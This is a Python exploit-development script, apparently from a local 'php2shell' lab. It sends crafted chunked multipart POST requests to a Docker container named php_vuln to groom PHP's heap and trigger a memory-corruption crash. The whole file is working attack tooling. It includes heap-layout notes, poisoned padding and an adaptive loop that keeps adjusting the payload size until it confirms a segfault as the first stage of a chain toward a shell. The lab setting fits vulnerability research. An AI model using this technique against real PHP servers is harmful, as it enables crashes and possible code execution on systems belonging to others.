#!/usr/bin/env python3
"""php2shell lab, oom25: corrected-scale adaptive walk (rem in MB range).

oom24 post-mortem: (a) direction inverted — pool ~= 128MB - 2*(body) via
double buffering, so BIGGER rem = SMALLER pool; survive -> raise rem.
(b) scale: band (pool 19,034..19,362B at element-513 resize) maps to
rem ~= (128MB - 2*466*128KB - 19KB)/2 ~= 4.4 MB, not 24KB.
Walk: coarse 256KB steps until first post-resize death, then 2KB-step
grind across the boundary (jitter band ~164B in rem-space per boot).
Kill window unchanged: key 328B dies POST-COMMIT after resize leaves
free' in [602, 930).
"""
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import part, POISON, UNIT, alloc_n  # noqa: E402

NKEYS = 400
V = 64

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def build(rem: int) -> list:
    ps = []
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))
    fill = POISON * UNIT
    total = 466 * UNIT + rem - 9 * UNIT
    u = 0
    while total >= UNIT:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * total))
    for k in range(NKEYS):
        nm = POISON * (280 + (k % 40)) + b"%d" % k
        ps.append(part(nm, POISON * V))
    return ps

def send(port: int, parts: list):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=180)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def segcheck():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "150"],
                       capture_output=True, text=True)
    return [l for l in (r.stdout + r.stderr).splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081

    def log(*a, **k):
        k.pop("flush", None)
        print(*a, flush=True)

    rem = 4_200_000
    coarse = 262_144
    fine = 2048
    mode = "coarse"
    fine_lo = fine_hi = None
    last_death = None
    nf = 0
    for boot in range(64):
        restart()
        fatal, text = send(port, build(rem))
        a = alloc_n(text) if fatal else None
        keyhit = False
        if not fatal:
            verdict = "survive (pool above band)"
            # survive -> pool too big -> smaller pool -> BIGGER rem
            if mode == "coarse":
                rem += coarse
                if last_death is not None:
                    mode = "fine"
            else:
                rem += fine
                fine_lo = rem
        else:
            nf += 1
            if a is None:
                verdict = "fatal?alloc (pool under band)"
                rem -= coarse
            elif a <= 600:
                verdict = f"*** KEY DEATH alloc={a} — SEGFAULT CHECK ***"
                keyhit = True
            elif a < 18432:
                verdict = "post-resize small death (pool just under band)"
                last_death = rem
                mode = "fine"
                fine_hi = rem
                # pool under band -> need bigger pool -> SMALLER rem
                rem -= fine
            elif a < 60000:
                verdict = "resize death (pool well under band)"
                rem -= coarse
            else:
                verdict = "value death (fill hit wall early)"
                rem -= coarse
        log(f"boot{boot} [{mode}] rem={rem}: fatal={fatal} alloc={a} {verdict}")
        if keyhit:
            time.sleep(1.5)
            hits = segcheck()
            for h in hits:
                log("SEGV: " + h)
            if hits:
                log("*** SEGFAULT REPRODUCED — chain complete ***")
                return
            continue
        if mode == "fine" and fine_lo and fine_hi and abs(fine_lo - fine_hi) <= fine:
            log(f"boundary bracketed: [{fine_hi}, {fine_lo}] — grinding")
            rem = (fine_lo + fine_hi) // 2
    log(f"== oom25 done: {nf} fatals, final rem={rem} ==")

if __name__ == "__main__":
    main()
